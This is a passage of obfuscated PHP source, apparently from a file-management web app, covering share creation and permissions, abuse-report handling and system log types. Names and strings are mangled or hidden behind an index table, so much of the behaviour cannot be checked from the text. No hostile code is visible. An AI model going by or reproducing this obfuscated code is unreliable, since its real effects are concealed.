array($ÒúÙèÃ[628] => SourceModel::TYPE_GROUP, $ÒúÙèÃ[550] => array($ÒúÙèÃ[7], $”¢†–Ş)), $ÒúÙèÃ[2033] => $ÒúÙèÃ[1986]); } $´÷âãı = Model($ÒúÙèÃ[646])->where($‹ú×ñë)->selectPage($ ğŸšå‡); $¡÷‰¶¬ = array_to_keyvalue_group($´÷âãı[$ÒúÙèÃ[424]], $ÒúÙèÃ[645]); if (!$¡÷‰¶¬) { return $´÷âãı; } $´…¢È¬È = $ÒúÙèÃ[2036]; $‹ú×ñë = array($ÒúÙèÃ[645] => array($ÒúÙèÃ[471], array_keys($¡÷‰¶¬)), $ÒúÙèÃ[1690] => array($ÒúÙèÃ[1055], $ÒúÙèÃ[214])); $Š¶‡ÇŠ = $this->field($´…¢È¬È)->where($‹ú×ñë)->select(); foreach ($Š¶‡ÇŠ as $‘Œ¨ÆÜı => &$Ñ‡²÷§Å) { $Ñ‡²÷§Å[$ÒúÙèÃ[2032]] = $¡÷‰¶¬[$Ñ‡²÷§Å[$ÒúÙèÃ[645]]]; } unset($Ñ‡²÷§Å); $ŸÔšàŠ¹ = array($ÒúÙèÃ[2037] => $Š¶‡ÇŠ, $ÒúÙèÃ[2038] => $´÷âãı[$ÒúÙèÃ[421]]); return $ŸÔšàŠ¹; } protected function shareAdd($¨Ş÷©Èñ, $½Õ¶´±) { $Í…Ù¨†¤ =& $_SERVER[ •ŒÓîÆ]; $íŒŸ¤ìÆ = $this->_addShareData($¨Ş÷©Èñ, $½Õ¶´±); if (!empty($½Õ¶´±[$Í…Ù¨†¤[2039]])) { $this->_shareAuthSet($íŒŸ¤ìÆ, $½Õ¶´±[$Í…Ù¨†¤[2039]]); } $this->shareEventAdd($¨Ş÷©Èñ, $½Õ¶´±, $Í…Ù¨†¤[2040]); return $íŒŸ¤ìÆ; } protected function shareAddSystem($üàŸ ğË, $ÔÆ±™Ö) { $”Óš»ü™ =& $_SERVER[ •ŒÓîÆ]; $ˆ¨®Öå¶ = $this->_addShareData($üàŸ ğË, $ÔÆ±™Ö, $”Óš»ü™[181]); $this->_shareAuthSet($ˆ¨®Öå¶, $ÔÆ±™Ö[$”Óš»ü™[2039]]); return $ˆ¨®Öå¶; } private function shareEventAdd($‡ˆ—Àşú, $¾œÀ¹‚º, $ğÓÓÍü = "\x61\x64\144") { $ÚâÂŞ’î =& $_SERVER[ •ŒÓîÆ]; if (!$‡ˆ—Àşú || $‡ˆ—Àşú == $ÚâÂŞ’î[214]) { return; } if ($ğÓÓÍü == $ÚâÂŞ’î[2040]) { if ($¾œÀ¹‚º[$ÚâÂŞ’î[542]] == $ÚâÂŞ’î[90]) { Model($ÚâÂŞ’î[613])->eventShare($‡ˆ—Àşú, $ÚâÂŞ’î[2041]); } if ($¾œÀ¹‚º[$ÚâÂŞ’î[643]] == $ÚâÂŞ’î[90]) { Model($ÚâÂŞ’î[613])->eventShare($‡ˆ—Àşú, $ÚâÂŞ’î[2042]); } return; } $˜á„Èî… = $this->getInfoByPath($‡ˆ—Àşú); $ÄãŒ¡Œ = $ÚâÂŞ’î[2043]; if ($˜á„Èî…[$ÚâÂŞ’î[542]] == $ÚâÂŞ’î[214] && $¾œÀ¹‚º[$ÚâÂŞ’î[542]] == $ÚâÂŞ’î[90]) { $ÄãŒ¡Œ = $ÚâÂŞ’î[2041]; } if ($˜á„Èî…[$ÚâÂŞ’î[542]] == $ÚâÂŞ’î[90] && $¾œÀ¹‚º[$ÚâÂŞ’î[542]] == $ÚâÂŞ’î[214]) { $ÄãŒ¡Œ = $ÚâÂŞ’î[2044]; } if ($˜á„Èî…[$ÚâÂŞ’î[643]] == $ÚâÂŞ’î[214] && $¾œÀ¹‚º[$ÚâÂŞ’î[643]] == $ÚâÂŞ’î[90]) { $ÄãŒ¡Œ = $ÚâÂŞ’î[2042]; } if ($˜á„Èî…[$ÚâÂŞ’î[643]] == $ÚâÂŞ’î[90] && $¾œÀ¹‚º[$ÚâÂŞ’î[643]] == $ÚâÂŞ’î[214]) { $ÄãŒ¡Œ = $ÚâÂŞ’î[2045]; } Model($ÚâÂŞ’î[613])->eventShare($‡ˆ—Àşú, $ÄãŒ¡Œ); return; } private function _addShareData($åÉÕ–ş’, $Ì‹ñ ÜÒ = array(), $âÜ§³°È = false) { $ÙøÆ–Õù =& $_SERVER[ •ŒÓîÆ]; $€‘ë±•¦ = $âÜ§³°È == $ÙøÆ–Õù[181] ? 0 : USER_ID; $ÑÇÀÃÎÓ = array($ÙøÆ–Õù[470] => $åÉÕ–ş’, $ÙøÆ–Õù[1681] => $€‘ë±•¦); if ($åÉÕ–ş’ == 0) { $ÑÇÀÃÎÓ = array($ÙøÆ–Õù[2046] => $Ì‹ñ ÜÒ[$ÙøÆ–Õù[1216]], $ÙøÆ–Õù[1681] => $€‘ë±•¦); } if ($Ùõ§·ô = $this->where($ÑÇÀÃÎÓ)->find()) { return $Ùõ§·ô[$ÙøÆ–Õù[645]]; } if ($åÉÕ–ş’ == 0) { $ú”ÑÑ²£ = array($ÙøÆ–Õù[32] => get_path_this($Ì‹ñ ÜÒ[$ÙøÆ–Õù[86]])); } else { $ú”ÑÑ²£ = Model($ÙøÆ–Õù[866])->sourceInfo($åÉÕ–ş’); if (!$ú”ÑÑ²£) { return !1; } } if (!$Ì‹ñ ÜÒ[$ÙøÆ–Õù[1585]]) { $Ì‹ñ ÜÒ[$ÙøÆ–Õù[1585]] = $ú”ÑÑ²£[$ÙøÆ–Õù[32]]; } $øÎ­Ôå = array($ÙøÆ–Õù[1681] => $€‘ë±•¦, $ÙøÆ–Õù[470] => $åÉÕ–ş’, $ÙøÆ–Õù[1585] => $ÙøÆ–Õù[12], $ÙøÆ–Õù[542] => 0, $ÙøÆ–Õù[643] => 0, $ÙøÆ–Õù[1216] => $ÙøÆ–Õù[12], $ÙøÆ–Õù[362] => $ÙøÆ–Õù[12], $ÙøÆ–Õù[930] => $ÙøÆ–Õù[12], $ÙøÆ–Õù[2047] => 0, $ÙøÆ–Õù[2048] => 0, $ÙøÆ–Õù[802] => 0, $ÙøÆ–Õù[2049] => $ÙøÆ–Õù[12], $ÙøÆ–Õù[2030] => $ÙøÆ–Õù[12]); $ùÖ¤°Á» = explode($ÙøÆ–Õù[50], $ÙøÆ–Õù[2050]); foreach ($ùÖ¤°Á» as $›Òáµˆß) { if (!isset($Ì‹ñ ÜÒ[$›Òáµˆß])) { continue; } $øÎ­Ôå[$›Òáµˆß] = $Ì‹ñ ÜÒ[$›Òáµˆß]; } $ÍŞºÄ» = $this->add($øÎ­Ôå); $Øõô½‡¿ = array($ÙøÆ–Õù[2030] => short_id($ÍŞºÄ»)); $this->where(array($ÙøÆ–Õù[2051] => $ÍŞºÄ»))->save($Øõô½‡¿); return $ÍŞºÄ»; } private function _shareAuthSet($çĞ×•ì, $´óÄøæ½) { $©¿Ùİó€ =& $_SERVER[ •ŒÓîÆ]; if (!is_array($´óÄøæ½)) { return !1; } $ëĞĞ›ºÃ = Model($©¿Ùİó€[1996]); $ëĞĞ›ºÃ->where(array($©¿Ùİó€[645] => $çĞ×•ì))->delete(); $Ÿà•Œ = array(); foreach ($´óÄøæ½ as $êûî ÓØ) { $¶÷¦áôÄ = SourceModel::TYPE_USER; if ($êûî ÓØ[$©¿Ùİó€[180]] == SourceModel::TYPE_GROUP) { $¶÷¦áôÄ = SourceModel::TYPE_GROUP; } $… ²²€ = array($©¿Ùİó€[645] => $çĞ×•ì, $©¿Ùİó€[180] => $¶÷¦áôÄ, $©¿Ùİó€[550] => intval($êûî ÓØ[$©¿Ùİó€[550]]), $©¿Ùİó€[1992] => 0, $©¿Ùİó€[2052] => -1); if ($êûî ÓØ[$©¿Ùİó€[1992]]) { $… ²²€[$©¿Ùİó€[1992]] = $êûî ÓØ[$©¿Ùİó€[1992]]; } else { if ($êûî ÓØ[$©¿Ùİó€[2052]]) { $… ²²€[$©¿Ùİó€[2052]] = $êûî ÓØ[$©¿Ùİó€[2052]]; } } $Ÿà•Œ[] = $… ²²€; } return $ëĞĞ›ºÃ->addAll($Ÿà•Œ, array(), !0); } public function numViewAdd($ÅÁÌ³) { $Å·ãñ¸ï =& $_SERVER[ •ŒÓîÆ]; $Ú¬‘Í÷ = array($Å·ãñ¸ï[2051] => $ÅÁÌ³); $this->where($Ú¬‘Í÷)->setAdd($Å·ãñ¸ï[2047]); } public function numDownloadAdd($ÂÜı÷Æ¨) { $ÎıŠÅÚ =& $_SERVER[ •ŒÓîÆ]; $±÷ôæïË = array($ÎıŠÅÚ[2051] => $ÂÜı÷Æ¨); $this->where($±÷ôæïË)->setAdd($ÎıŠÅÚ[2048]); } protected function shareEdit($è§”Ğªâ, $´½Ã·…ï) { $ë¡áÎ§‘ =& $_SERVER[ •ŒÓîÆ]; $’‹©¾Ñ  = $this->getInfo($è§”Ğªâ); if (!$’‹©¾Ñ ) { return !1; } $this->_checkLinkShare($´½Ã·…ï, $’‹©¾Ñ ); $½Îàå°± = array(); $Æ²Ğ¼ˆ = explode($ë¡áÎ§‘[50], $ë¡áÎ§‘[2053]); foreach ($Æ²Ğ¼ˆ as $ÂÕ¹Ìõ) { if (!array_key_exists($ÂÕ¹Ìõ, $´½Ã·…ï)) { continue; } $½Îàå°±[$ÂÕ¹Ìõ] = $´½Ã·…ï[$ÂÕ¹Ìõ]; } $this->shareEventAdd($’‹©¾Ñ [$ë¡áÎ§‘[183]], $´½Ã·…ï, $ë¡áÎ§‘[1858]); $this->where(array($ë¡áÎ§‘[2051] => $è§”Ğªâ))->save($½Îàå°±); if (isset($´½Ã·…ï[$ë¡áÎ§‘[2039]])) { $this->_shareAuthSet($è§”Ğªâ, $´½Ã·…ï[$ë¡áÎ§‘[2039]]); } return !0; } private function _checkLinkShare($†¡—•‘Ë, $¼Ä—êàª) { $¿œĞ¤ñƒ =& $_SERVER[ •ŒÓîÆ]; if ($†¡—•‘Ë[$¿œĞ¤ñƒ[542]] != $¿œĞ¤ñƒ[90]) { return; } $È§ş¢“ = $¼Ä—êàª[$¿œĞ¤ñƒ[89]][$¿œĞ¤ñƒ[183]]; if ($¼Ä—êàª[$¿œĞ¤ñƒ[89]][$¿œĞ¤ñƒ[33]] != $¿œĞ¤ñƒ[216]) { $ë‡™åùù = $this->_folderReport($È§ş¢“); if (!$ë‡™åùù) { return; } show_json(LNG($¿œĞ¤ñƒ[2054]) . $¿œĞ¤ñƒ[2055] . $ë‡™åùù, !1); } $üÈ­Û·† = Model($¿œĞ¤ñƒ[866])->fileInfoGet($¼Ä—êàª[$¿œĞ¤ñƒ[89]][$¿œĞ¤ñƒ[183]]); if (!$üÈ­Û·†) { return; } $‘ÎË§©• = $this->shareFileMeta($üÈ­Û·†[$¿œĞ¤ñƒ[520]]); if (isset($‘ÎË§©•[$¿œĞ¤ñƒ[429]]) && $‘ÎË§©•[$¿œĞ¤ñƒ[429]] == $¿œĞ¤ñƒ[90]) { show_json(LNG($¿œĞ¤ñƒ[2056]), !1); } } private function _folderReport($óèØ„¢‡) { $··ˆ«‹Ò =& $_SERVER[ •ŒÓîÆ]; $‚”©´Òè = array($··ˆ«‹Ò[520] => array($··ˆ«‹Ò[1053], 0), $··ˆ«‹Ò[791] => 3); $’ÅÇğË = Model($··ˆ«‹Ò[2057])->where($‚”©´Òè)->field($··ˆ«‹Ò[520])->select(); if (!$’ÅÇğË) { return !1; } $’ÅÇğË = array_to_keyvalue($’ÅÇğË, $··ˆ«‹Ò[12], $··ˆ«‹Ò[520]); $Š—ÅäŸ‹ = $··ˆ«‹Ò[50] . $óèØ„¢‡ . $··ˆ«‹Ò[50]; $‚”©´Òè = array($··ˆ«‹Ò[520] => array($··ˆ«‹Ò[7], $’ÅÇğË), $··ˆ«‹Ò[565] => array($··ˆ«‹Ò[437], "\45{$Š—ÅäŸ‹}\45"), $··ˆ«‹Ò[484] => 0); $†ËåØâ± = Model($··ˆ«‹Ò[866])->where($‚”©´Òè)->field($··ˆ«‹Ò[2058])->find(); if (!$†ËåØâ±) { return !1; } $¢ù¼Ş¤† = substr($†ËåØâ±[$··ˆ«‹Ò[565]], strpos($†ËåØâ±[$··ˆ«‹Ò[565]], $Š—ÅäŸ‹)); $‚”©´Òè = array($··ˆ«‹Ò[183] => array($··ˆ«‹Ò[7], trim($¢ù¼Ş¤†, $··ˆ«‹Ò[50]))); $¿®à™›İ = Model($··ˆ«‹Ò[866])->where($‚”©´Òè)->field($··ˆ«‹Ò[32])->select(); $Í»»Êû” = array_to_keyvalue($¿®à™›İ, $··ˆ«‹Ò[12], $··ˆ«‹Ò[32]); $Í»»Êû”[] = $†ËåØâ±[$··ˆ«‹Ò[32]]; return implode($··ˆ«‹Ò[8], $Í»»Êû”); } protected function remove($Ì¬®ã™) { $‰¶ç®„Š =& $_SERVER[ •ŒÓîÆ]; if (is_array($Ì¬®ã™)) { $Ì¬®ã™ = array($‰¶ç®„Š[7], $Ì¬®ã™); } $¥¤Š•”ñ = array($‰¶ç®„Š[645] => $Ì¬®ã™); $Óúµ‚ = $this->where($¥¤Š•”ñ)->delete(); if ($Óúµ‚) { Model($‰¶ç®„Š[646])->where(array($‰¶ç®„Š[645] => $Ì¬®ã™))->delete(); } $÷º“ÕåÄ = is_array($Ì¬®ã™) ? $Ì¬®ã™[1] : array($Ì¬®ã™); for ($©î’Ş«” = 0; $©î’Ş«” < count($÷º“ÕåÄ); $©î’Ş«”++) { $îˆû€Ê† = $this->getInfo($÷º“ÕåÄ[$©î’Ş«”]); if ($îˆû€Ê†[$‰¶ç®„Š[643]] == $‰¶ç®„Š[90]) { Model($‰¶ç®„Š[613])->eventShare($îˆû€Ê†[$‰¶ç®„Š[183]], $‰¶ç®„Š[2045]); } if ($îˆû€Ê†[$‰¶ç®„Š[542]] == $‰¶ç®„Š[90]) { Model($‰¶ç®„Š[613])->eventShare($îˆû€Ê†[$‰¶ç®„Š[183]], $‰¶ç®„Š[2044]); } } return $Óúµ‚; } protected function removeBySource($ÄáÇÓÒõ) { $´º»ší€ =& $_SERVER[ •ŒÓîÆ]; $›çÆõ«Ö = array($´º»ší€[470] => array($´º»ší€[471], $ÄáÇÓÒõ)); $í”Äñ¡í = $this->field($´º»ší€[645])->where($›çÆõ«Ö)->select(); $í”Äñ¡í = array_to_keyvalue($í”Äñ¡í, $´º»ší€[12], $´º»ší€[645]); if (!$í”Äñ¡í) { return; } $›çÆõ«Ö = array($´º»ší€[2051] => array($´º»ší€[471], $í”Äñ¡í)); $this->where($›çÆõ«Ö)->delete(); Model($´º»ší€[646])->where($›çÆõ«Ö)->delete(); } public function listAll($¹´œ´°) { $–Ÿî¡ü† =& $_SERVER[ •ŒÓîÆ]; $½ò…À¬¼ = array(); if ($¹´œ´°[$–Ÿî¡ü†[1690]]) { $½ò…À¬¼[$–Ÿî¡ü†[1690]] = $¹´œ´°[$–Ÿî¡ü†[1690]]; } if ($¹´œ´°[$–Ÿî¡ü†[801]]) { $¯Ò›–ó = $¹´œ´°[$–Ÿî¡ü†[802]] ? $¹´œ´°[$–Ÿî¡ü†[802]] : strtotime(date($–Ÿî¡ü†[2059])); $½ò…À¬¼[$–Ÿî¡ü†[217]] = array($–Ÿî¡ü†[388], array($¹´œ´°[$–Ÿî¡ü†[801]], $¯Ò›–ó)); } if ($¹´œ´°[$–Ÿî¡ü†[33]]) { $½ò…À¬¼[$¹´œ´°[$–Ÿî¡ü†[33]]] = 1; } else { $½ò…À¬¼[] = array($–Ÿî¡ü†[542] => array($–Ÿî¡ü†[1053], 0), $–Ÿî¡ü†[643] => array($–Ÿî¡ü†[1053], 0), $–Ÿî¡ü†[2033] => $–Ÿî¡ü†[1986]); } if ($¹´œ´°[$–Ÿî¡ü†[1982]]) { $½ò…À¬¼[] = array($–Ÿî¡ü†[2030] => $¹´œ´°[$–Ÿî¡ü†[1982]], $–Ÿî¡ü†[1585] => array($–Ÿî¡ü†[437], "\45{$¹´œ´°[$–Ÿî¡ü†[1982]]}\x25"), $–Ÿî¡ü†[2033] => $–Ÿî¡ü†[1986]); } $’ñ¢Èí = $this->_makeOrder()->where($½ò…À¬¼)->selectPage(20); if (empty($’ñ¢Èí[$–Ÿî¡ü†[424]])) { return array(); } $this->_listDataApply($’ñ¢Èí[$–Ÿî¡ü†[424]]); return $’ñ¢Èí; } public function listDataApply($àŒÏùèá) { $this->_listDataApply($àŒÏùèá); return $àŒÏùèá; } private function _listDataApply(&$è×»ÕÍ¡) { $¥ºïÄâá =& $_SERVER[ •ŒÓîÆ]; $ä…˜şè÷ = array_to_keyvalue($è×»ÕÍ¡, $¥ºïÄâá[12], $¥ºïÄâá[1690]); $ÅĞË‹„Æ = Model($¥ºïÄâá[579])->userListInfo(array_unique($ä…˜şè÷)); $É´¿°Ş = array_to_keyvalue($è×»ÕÍ¡, $¥ºïÄâá[12], $¥ºïÄâá[183]); $âôªçÆ¸ = Model($¥ºïÄâá[866])->sourceListInfo($É´¿°Ş, !0); foreach ($è×»ÕÍ¡ as $Ü¹·Íåá => &$¤ê¹Æ²ö) { $´ÆÆ€ ‰ = $¤ê¹Æ²ö[$¥ºïÄâá[1690]]; $¤ê¹Æ²ö[$¥ºïÄâá[2060]] = $ÅĞË‹„Æ[$´ÆÆ€ ‰] ? $ÅĞË‹„Æ[$´ÆÆ€ ‰] : !1; $×¼™ÍûÎ = $¤ê¹Æ²ö[$¥ºïÄâá[183]]; $¤ê¹Æ²ö[$¥ºïÄâá[89]] = $âôªçÆ¸[$×¼™ÍûÎ] ? $âôªçÆ¸[$×¼™ÍûÎ] : !1; if ($¤ê¹Æ²ö[$¥ºïÄâá[89]][$¥ºïÄâá[484]] == $¥ºïÄâá[90]) { unset($è×»ÕÍ¡[$Ü¹·Íåá]); } if ($¤ê¹Æ²ö[$¥ºïÄâá[89]] != $¥ºïÄâá[214] && !$¤ê¹Æ²ö[$¥ºïÄâá[89]]) { unset($è×»ÕÍ¡[$Ü¹·Íåá]); } } unset($¤ê¹Æ²ö); $è×»ÕÍ¡ = array_values($è×»ÕÍ¡); } private function _makeOrder($»š”Èî× = '') { $Œ¾¹ıÛô =& $_SERVER[ •ŒÓîÆ]; $¾ò€Ø§ = array($Œ¾¹ıÛô[217], $Œ¾¹ıÛô[802], $Œ¾¹ıÛô[2047], $Œ¾¹ıÛô[2048]); $áÏıóƒÄ = array($Œ¾¹ıÛô[502] => $Œ¾¹ıÛô[503], $Œ¾¹ıÛô[504] => $Œ¾¹ıÛô[505]); $”ššÎùÇ = Input::get($Œ¾¹ıÛô[509], $Œ¾¹ıÛô[7], $Œ¾¹ıÛô[476], $¾ò€Ø§); $áú“³„ = Input::get($Œ¾¹ıÛô[510], $Œ¾¹ıÛô[7], $Œ¾¹ıÛô[2061], array($Œ¾¹ıÛô[1979], $Œ¾¹ıÛô[504])); $áú“³„ = $áÏıóƒÄ[$áú“³„]; $»š”Èî× = $»š”Èî× . "{$”ššÎùÇ}\40{$áú“³„}"; return $this->order($»š”Èî×); } public function reportAdd($™é»”¾) { $Èì˜ù” =& $_SERVER[ •ŒÓîÆ]; $Ö™èœö = array($Èì˜ù”[645] => $™é»”¾[$Èì˜ù”[645]], $Èì˜ù”[1690] => USER_ID); if (Model($Èì˜ù”[2057])->where($Ö™èœö)->find()) { return !1; } $»Ñ¶šéş = array($Èì˜ù”[645] => $™é»”¾[$Èì˜ù”[645]], $Èì˜ù”[1585] => $™é»”¾[$Èì˜ù”[1585]], $Èì˜ù”[183] => $™é»”¾[$Èì˜ù”[183]], $Èì˜ù”[520] => $™é»”¾[$Èì˜ù”[520]], $Èì˜ù”[1690] => USER_ID, $Èì˜ù”[33] => $™é»”¾[$Èì˜ù”[33]], $Èì˜ù”[505] => $™é»”¾[$Èì˜ù”[505]]); return Model($Èì˜ù”[2057])->add($»Ñ¶šéş); } public function reportList($ö½¤†À×) { $ô‚è’¬ =& $_SERVER[ •ŒÓîÆ]; $ò¬ÁÃØ = array(); if ($ö½¤†À×[$ô‚è’¬[801]]) { $ÂÈÚ„‰ò = $ö½¤†À×[$ô‚è’¬[802]] ? $ö½¤†À×[$ô‚è’¬[802]] : strtotime(date($ô‚è’¬[2059])); $ò¬ÁÃØ[$ô‚è’¬[217]] = array($ô‚è’¬[388], array($ö½¤†À×[$ô‚è’¬[801]], $ÂÈÚ„‰ò)); } if (isset($ö½¤†À×[$ô‚è’¬[33]]) && in_array($ö½¤†À×[$ô‚è’¬[33]], array($ô‚è’¬[90], $ô‚è’¬[489], $ô‚è’¬[2062], $ô‚è’¬[2063], $ô‚è’¬[2064]))) { $ò¬ÁÃØ[$ô‚è’¬[33]] = $ö½¤†À×[$ô‚è’¬[33]]; } if (isset($ö½¤†À×[$ô‚è’¬[791]]) && in_array($ö½¤†À×[$ô‚è’¬[791]], array($ô‚è’¬[214], $ô‚è’¬[90], $ô‚è’¬[489], $ô‚è’¬[2062]))) { $ò¬ÁÃØ[$ô‚è’¬[791]] = $ö½¤†À×[$ô‚è’¬[791]]; } $ÀÆåŸÂ« = Input::get($ô‚è’¬[510], $ô‚è’¬[7], $ô‚è’¬[2061], array($ô‚è’¬[1979], $ô‚è’¬[504])); $³ß¼³» = array($ô‚è’¬[502] => $ô‚è’¬[503], $ô‚è’¬[504] => $ô‚è’¬[505]); $èøğä®¿ = $ô‚è’¬[2065] . $³ß¼³»[$ÀÆåŸÂ«]; $íÑô£·Ò = Model($ô‚è’¬[2057])->where($ò¬ÁÃØ)->order($èøğä®¿)->selectPage(20); if (empty($íÑô£·Ò[$ô‚è’¬[424]])) { return array(); } $ÂæÊ–À§ = array_to_keyvalue_group($íÑô£·Ò[$ô‚è’¬[424]], $ô‚è’¬[791], $ô‚è’¬[645]); if (!empty($ÂæÊ–À§[0])) { $ö½¤†À× = $ÂæÊ–À§[0]; $ò¬ÁÃØ = array($ô‚è’¬[645] => array($ô‚è’¬[7], $ö½¤†À×)); $Î´Ä²ø = $this->where($ò¬ÁÃØ)->field($ô‚è’¬[645])->select(); $Î´Ä²ø = array_to_keyvalue($Î´Ä²ø, $ô‚è’¬[12], $ô‚è’¬[645]); $ÊÏÌìù = array_diff($ö½¤†À×, $Î´Ä²ø); if (!empty($ÊÏÌìù)) { foreach ($íÑô£·Ò[$ô‚è’¬[424]] as $Ê±ĞîöÅ => $ÓûšƒÁ—) { if (in_array($ÓûšƒÁ—[$ô‚è’¬[645]], $ÊÏÌìù)) { unset($íÑô£·Ò[$ô‚è’¬[424]][$Ê±ĞîöÅ]); } } } } $this->_listDataApply($íÑô£·Ò[$ô‚è’¬[424]]); return $íÑô£·Ò; } public function reportStatus($—ÕîµÃÆ) { $§ÛÎ¿¤® =& $_SERVER[ •ŒÓîÆ]; $”ÂÁ¥© = array($§ÛÎ¿¤®[453] => $—ÕîµÃÆ[$§ÛÎ¿¤®[453]]); $ßõòË— = Model($§ÛÎ¿¤®[2057])->where($”ÂÁ¥©)->field($§ÛÎ¿¤®[2066])->find(); if (!$ßõòË—) { return !1; } $ğ£‹ëä¼ = array($§ÛÎ¿¤®[791] => $—ÕîµÃÆ[$§ÛÎ¿¤®[791]]); if ($—ÕîµÃÆ[$§ÛÎ¿¤®[791]] == $§ÛÎ¿¤®[2062] && $ßõòË—[$§ÛÎ¿¤®[791]] == $§ÛÎ¿¤®[2062]) { $ğ£‹ëä¼[$§ÛÎ¿¤®[791]] = 0; } $º»’Ç = Model($§ÛÎ¿¤®[2057])->where($”ÂÁ¥©)->save($ğ£‹ëä¼); if ($—ÕîµÃÆ[$§ÛÎ¿¤®[791]] == $§ÛÎ¿¤®[489]) { if ($ßõòË—[$§ÛÎ¿¤®[520]] != $§ÛÎ¿¤®[214] && $this->shareFileMeta($ßõòË—[$§ÛÎ¿¤®[520]])) { $this->shareFileMeta($ßõòË—[$§ÛÎ¿¤®[520]], 0); } $this->remove($ßõòË—[$§ÛÎ¿¤®[645]]); return !0; } if ($º»’Ç && $—ÕîµÃÆ[$§ÛÎ¿¤®[791]] == $§ÛÎ¿¤®[2062]) { $À©õÚ˜ = $ğ£‹ëä¼[$§ÛÎ¿¤®[791]] == $§ÛÎ¿¤®[2062] ? 1 : 0; $this->shareFileMeta($ßõòË—[$§ÛÎ¿¤®[520]], $À©õÚ˜); $this->removeByFile($ßõòË—[$§ÛÎ¿¤®[520]]); } return $º»’Ç; } private function removeByFile($®ãŸì®ú) { $ß¢¤äÇ° =& $_SERVER[ •ŒÓîÆ]; $ƒÎß…É÷ = Model($ß¢¤äÇ°[866])->where(array($ß¢¤äÇ°[520] => $®ãŸì®ú))->field($ß¢¤äÇ°[183])->select(); $¸ù±ì½Ô = array_to_keyvalue($ƒÎß…É÷, $ß¢¤äÇ°[12], $ß¢¤äÇ°[183]); $Ô±¨±‡ = array($ß¢¤äÇ°[183] => array($ß¢¤äÇ°[7], $¸ù±ì½Ô), $ß¢¤äÇ°[542] => 1); $ƒÎß…É÷ = $this->where($Ô±¨±‡)->field($ß¢¤äÇ°[645])->select(); if (empty($ƒÎß…É÷)) { return; } $ÕÉ½ÕñÇ = array_to_keyvalue($ƒÎß…É÷, $ß¢¤äÇ°[12], $ß¢¤äÇ°[645]); $this->remove($ÕÉ½ÕñÇ); } private function shareFileMeta($í¬¡²ÇÓ, $»°Ş¡¨ = null) { $€ôù˜İÂ =& $_SERVER[ •ŒÓîÆ]; $áÇ½÷í = array($€ôù˜İÂ[520] => $í¬¡²ÇÓ, $€ôù˜İÂ[96] => $€ôù˜İÂ[2067]); if (is_null($»°Ş¡¨)) { return Model($€ôù˜İÂ[2068])->where($áÇ½÷í)->find(); } $áÇ½÷í[$€ôù˜İÂ[429]] = $»°Ş¡¨; Model($€ôù˜İÂ[2068])->add($áÇ½÷í, array(), !0); } } goto cñƒ‚¨‚º“; b‹œéÖ‹Ä¯: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\x4c\151\x67\150\x74\x41\160\x70"; public $modelType = "\x53\171\x73\164\145\x6d\117\x70\x74\151\x6f\x6e"; public $field = array("\156\x61\155\145", "\147\162\x6f\x75\160", "\x64\x65\x73\143", "\143\157\x6e\164\x65\156\x74"); public function listData($¸ì¹Š© = false, $ÔüÇïŒ± = "\x6d\157\x64\151\x66\171\x54\151\x6d\x65", $˜‰àßÄ® = true) { return parent::listData($¸ì¹Š©, $ÔüÇïŒ±, $˜‰àßÄ®); } public function remove($Ä†ıØÙÙ) { $¬ÈØğ´ = $this->findByName($Ä†ıØÙÙ); if (!$¬ÈØğ´) { return !1; } return parent::remove($¬ÈØğ´[$_SERVER[ •ŒÓîÆ][453]]); } public function add($ñ’¹©Ïì) { if ($this->findByName($ñ’¹©Ïì[$_SERVER[ •ŒÓîÆ][32]])) { return !1; } return parent::insert($ñ’¹©Ïì); } public function update($‹”»»§°, $í¯·ëÙŞ) { $Ÿã‰©Íß =& $_SERVER[ •ŒÓîÆ]; $‡‚¯ Ù‹ = $this->findByName($‹”»»§°); $•‹‰‚÷ = $this->findByName($í¯·ëÙŞ[$Ÿã‰©Íß[32]]); if (!$‡‚¯ Ù‹ || $•‹‰‚÷ && $•‹‰‚÷[$Ÿã‰©Íß[453]] != $‡‚¯ Ù‹[$Ÿã‰©Íß[453]]) { return !1; } return parent::update($‡‚¯ Ù‹[$Ÿã‰©Íß[453]], $í¯·ëÙŞ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\x6d\x5f\x6c\157\147"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\x54\x69\x6d\x65", "\164\151\155\x65", "\x69\x6e\163\x65\x72\164", "\146\x75\156\143\x74\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $’ø©Úƒ™ =& $_SERVER[ •ŒÓîÆ]; return array($’ø©Úƒ™[2224] => LNG($’ø©Úƒ™[2225]), $’ø©Úƒ™[2226] => LNG($’ø©Úƒ™[2227]), $’ø©Úƒ™[1831] => LNG($’ø©Úƒ™[2228]), $’ø©Úƒ™[2229] => LNG($’ø©Úƒ™[2230]), $’ø©Úƒ™[2231] => LNG($’ø©Úƒ™[2232]), $’ø©Úƒ™[2233] => LNG($’ø©Úƒ™[2234]), $’ø©Úƒ™[2235] => LNG($’ø©Úƒ™[2236]), $’ø©Úƒ™[1861] => LNG($’ø©Úƒ™[2236]), $’ø©Úƒ™[1862] => LNG($’ø©Úƒ™[2237]), $’ø©Úƒ™[2238] => LNG($’ø©Úƒ™[2239]), $’ø©Úƒ™[2240] => LNG($’ø©Úƒ™[2241]), $’ø©Úƒ™[2242] => LNG($’ø©Úƒ™[2243]), $’ø©Úƒ™[2244] => LNG($’ø©Úƒ™[2245]), $’ø©Úƒ™[1859] => LNG($’ø©Úƒ™[2246]), $’ø©Úƒ™[2247] => LNG($’ø©Úƒ™[2248]), $’ø©Úƒ™[1866] => LNG($’ø©Úƒ™[2249]), $’ø©Úƒ™[2250] => LNG($’ø©Úƒ™[2251]), $’ø©Úƒ™[2252] => LNG($’ø©Úƒ™[2253]), $’ø©Úƒ™[2254] => LNG($’ø©Úƒ™[2255]), $’ø©Úƒ™[2256] => LNG($’ø©Úƒ™[2257]), $’ø©Úƒ™[1869] => LNG($’ø©Úƒ™[2258]), $’ø©Úƒ™[1870] => LNG($’ø©Úƒ™[2259]), $’ø©Úƒ™[2260] => LNG($’ø©Úƒ™[2261]), $’ø©Úƒ™[2262] => LNG($’ø©Úƒ™[2263]), $’ø©Úƒ™[2264] => LNG($’ø©Úƒ™[2265]), $’ø©Úƒ™[1864] => LNG($’ø©Úƒ™[2266]), $’ø©Úƒ™[2267] => LNG($’ø©Úƒ™[2268]), $’ø©Úƒ™[1863] => LNG($’ø©Úƒ™[2269]), $’ø©Úƒ™[2270] 